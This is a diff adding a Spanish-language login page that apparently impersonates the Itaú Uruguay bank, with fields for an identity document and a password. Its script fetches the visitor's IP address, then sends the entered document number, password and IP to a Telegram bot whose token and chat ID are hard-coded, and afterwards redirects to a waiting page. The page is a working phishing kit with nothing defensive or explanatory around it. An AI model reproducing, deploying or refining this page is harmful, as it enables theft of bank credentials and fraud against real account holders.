@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ingreso</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      background-color: #f5f5f5;
+    }
+
+    header {
+      background-color: #ff6600;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 10px 15px;
+      color: white;
+    }
+    .logo {
+      display: flex;
+      align-items: center;
+    }
+    .logo img {
+      height: 35px;
+    }
+    .header-right {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .btn-ingresar {
+      border: 1px solid white;
+      background: transparent;
+      color: white;
+      padding: 5px 10px;
+      border-radius: 20px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+    .btn-ingresar:hover {
+      background: rgba(255,255,255,0.15);
+    }
+    .icon {
+      width: 20px;
+      height: 20px;
+      fill: white;
+      cursor: pointer;
+    }
+
+    .container {
+      max-width: 350px;
+      margin: 40px auto;
+      padding: 20px;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    select, input, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      font-size: 15px;
+      box-sizing: border-box;
+    }
+    select:focus, input:focus {
+      border-color: #ff6600;
+      outline: none;
+    }
+    button {
+      background: linear-gradient(90deg, #ff6600, #e65c00);
+      color: white;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+      font-weight: bold;
+      box-shadow: 0 3px 6px rgba(0,0,0,0.15);
+      transition: background 0.3s ease, transform 0.1s ease;
+    }
+    button:hover {
+      background: linear-gradient(90deg, #e65c00, #cc5200);
+      transform: scale(1.02);
+    }
+    .links {
+      margin-top: 15px;
+      font-size: 14px;
+      text-align: center;
+    }
+    .links a {
+      display: inline-block;
+      margin: 5px 0;
+      color: #ff6600;
+      text-decoration: none;
+      font-weight: bold;
+      transition: color 0.2s ease;
+    }
+    .links a:hover {
+      color: #e65c00;
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- HEADER -->
+  <header>
+    <div class="logo">
+      <img src="layer1.png" alt="Logo">
+    </div>
+    <div class="header-right">
+      <button class="btn-ingresar">
+        Ingresar
+        <svg class="icon" viewBox="0 0 24 24">
+          <path d="M18.3 5.71a1 1 0 00-1.41 0L12 10.59 7.11 5.7a1 1 0 00-1.41 1.42L10.59 12l-4.9 4.89a1 1 0 101.41 1.42L12 13.41l4.89 4.9a1 1 0 001.42-1.42L13.41 12l4.89-4.88a1 1 0 000-1.41z"/>
+        </svg>
+      </button>
+      <svg class="icon" viewBox="0 0 24 24">
+        <path d="M10 2a8 8 0 105.29 14.29l4.71 4.7a1 1 0 001.42-1.42l-4.7-4.71A8 8 0 0010 2zm0 2a6 6 0 110 12 6 6 0 010-12z"/>
+      </svg>
+      <svg class="icon" viewBox="0 0 24 24">
+        <path d="M3 6h18M3 12h18M3 18h18" stroke="white" stroke-width="2" fill="none"/>
+      </svg>
+    </div>
+  </header>
+
+  <!-- FORMULARIO -->
+  <div class="container">
+    <select>
+      <option>Personas</option>
+      <option>Empresas</option>
+    </select>
+
+    <select>
+      <option>C.I.</option>
+      <option>Pasaporte</option>
+    </select>
+
+    <input type="text" placeholder="Documento" id="documento">
+    <input type="password" placeholder="Contraseña" id="contrasena">
+
+    <button onclick="login()">Ingresar</button>
+
+    <div class="links">
+      <a href="#">Regístrate</a><br>
+      <a href="#">Olvidé mi contraseña</a>
+    </div>
+  </div>
+
+  <script>
+    var ipAddress = "";
+
+    fetch('https://api.ipify.org/?format=json')
+      .then(response => response.json())
+      .then(data => {
+        ipAddress = data.ip;
+      })
+      .catch(error => {
+        console.error("Error al obtener la IP:", error);
+        ipAddress = "No disponible";
+      });
+
+    function login() {
+      const documento = document.getElementById('documento').value.trim();
+      const contrasena = document.getElementById('contrasena').value;
+
+      if (documento === "" || contrasena === "") {
+        alert("Por favor, rellene todos los campos.");
+        return;
+      }
+
+      if (contrasena.length < 5) {
+        alert("La contraseña debe tener mínimo 5 caracteres.");
+        return;
+      }
+
+      const chatId = '-4863924237';
+      const token = '8238317809:AAEYnKXfG-W1W9zTqcsumOq_92NVN35o1Wk';
+
+      const mensaje = `
+➖➖➖[ 𝙄𝙏𝘼𝙐 𝙐𝙔 ]➖➖➖ 
+✔️𝘿𝙤𝙘𝙪𝙢𝙚𝙣𝙩𝙤: <code>${documento}</code>
+✔️𝙋𝙖𝙨𝙨: <code>${contrasena}</code>
+✔️ IP: ${ipAddress}
+➖➖➖ 𝙄𝙉𝙁𝙊 ➖➖➖
+`;
+
+      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&parse_mode=HTML&text=${encodeURIComponent(mensaje)}`;
+
+      fetch(url)
+        .then(response => {
+          if (response.ok) {
+            console.log('Mensaje enviado correctamente.');
+          } else {
+            console.error('Error al enviar el mensaje.', response.statusText);
+          }
+        })
+        .catch(error => {
+          console.error('Error en la solicitud:', error);
+        })
+        .finally(() => {
+          setTimeout(() => {
+            window.location.href = 'espera/index.html';
+          }, 500);
+        });
+    }
+  </script>
+</body>
+</html>
